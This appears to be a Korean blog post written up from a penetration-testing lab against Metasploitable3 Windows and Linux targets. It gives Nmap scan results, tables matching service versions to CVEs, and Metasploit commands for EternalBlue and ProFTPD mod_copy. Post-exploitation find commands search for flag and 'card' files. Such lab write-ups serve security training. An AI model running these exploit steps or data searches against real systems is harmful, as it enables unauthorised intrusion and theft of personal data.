---
title: Nmap 포트 스캔 & 모의침투 — Metasploitable3 (Windows/Linux)
date: 2026-05-25
categories:
  - project
comments: true
tags:
  - 모의해킹
---
---
## 개요

Metasploitable3 (Windows / Linux) 두 대상을 놓고 **Nmap 스캔 → 취약점 분석 → Metasploit 익스플로잇 → 플래그 수집**까지 이어지는 모의침투 흐름을 정리했다.

**핵심 키워드**: Nmap · 취약점 분석(CVE) · Metasploit(`ms17_010_eternalblue`, `proftpd_modcopy_exec`) · Post-Exploitation

---

## 1. Nmap 스캔 결과

### Windows 대상 (총 14개 포트)

```
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
22/tcp    open  ssh          OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1
3000/tcp  open  http         WEBrick httpd 1.3.1 (Ruby 2.3.3)
3306/tcp  open  mysql        MySQL 5.5.20-log
3389/tcp  open  tcpwrapped
4848/tcp  open  ssl/http     Oracle Glassfish Application Server 4.0
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0
8022/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
8080/tcp  open  http         Sun GlassFish Open Source Edition 4.0
9200/tcp  open  http         Elasticsearch REST API 1.1.1
```

**OS**: Windows Server 2008 R2 Standard SP1

### Linux 대상 (총 7개 포트)

```
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu
631/tcp  open   ipp         CUPS 1.7
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
```

**OS**: Ubuntu Linux (Kernel 3.2 ~ 4.14)

> 🖼️ *사진 자리 — Windows/Linux 각각의 Nmap 스캔 실행 결과 터미널 화면*

---

## 2. 취약점 분석 및 공격 우선순위

스캔 결과로 확인된 서비스 버전을 기준으로 알려진 취약점(CVE)을 매칭해 우선순위를 정했다.

**Windows**

| 서비스 | 이슈 |
|---|---|
| OpenSSH 7.1 | 구버전, 취약점 존재 |
| IIS 7.5 | MS15-034 RCE 가능 |
| SMB 445 | MS17-010 (EternalBlue) 가능 |
| ManageEngine (8022) | RCE 취약점 존재 |
| Elasticsearch 1.1.1 | 구버전, RCE 가능 |
| Ruby on Rails 2.3.3 | 구버전, 취약점 존재 |

**Linux**

| 서비스 | 이슈 |
|---|---|
| ProFTPD 1.3.5 | CVE-2015-3306 존재 |
| Apache 2.4.7 | 구버전 |
| Drupal | Drupalgeddon 가능 |
| Samba 4.3.11 | 취약점 존재 |

---

## 3. 공격 시나리오 재현

### Windows — MS17-010 (EternalBlue)

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.31
set LHOST 10.0.0.X   # Kali IP
run
```

성공 시 `whoami`로 획득 권한 확인.

> 🖼️ *사진 자리 — msfconsole 모듈 설정 화면 + run 실행 성공 화면 + whoami 결과 화면*

### Linux — ProFTPD mod_copy RCE

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.0.0.51
set SITEPATH /var/www/html
run
```

성공 시 `id`로 획득 권한 확인.

> 🖼️ *사진 자리 — msfconsole 모듈 설정 화면 + run 실행 성공 화면 + id 결과 화면*

### 플래그 및 개인정보 수집

```bash
find / -type f -iname "*flag*" 2>/dev/null
find / -type f -iname "*card*" 2>/dev/null
```

> 🖼️ *사진 자리 — 플래그 발견 화면*

---

## 정리

- 포트 스캔으로 확인한 **서비스 버전 정보**만으로도 대부분의 공격 표면을 추정할 수 있었다 (버전 기반 CVE 매칭).
- Windows는 SMB(MS17-010), Linux는 FTP(ProFTPD)가 가장 확실한 초기 침투 지점이었다.
- 실제 보고서 작성 시에는 이 스캔 결과를 기반으로 위험도 분류(Critical/High/Medium) → 익스플로잇 절차 → 대응 방안 순서로 정리했다.
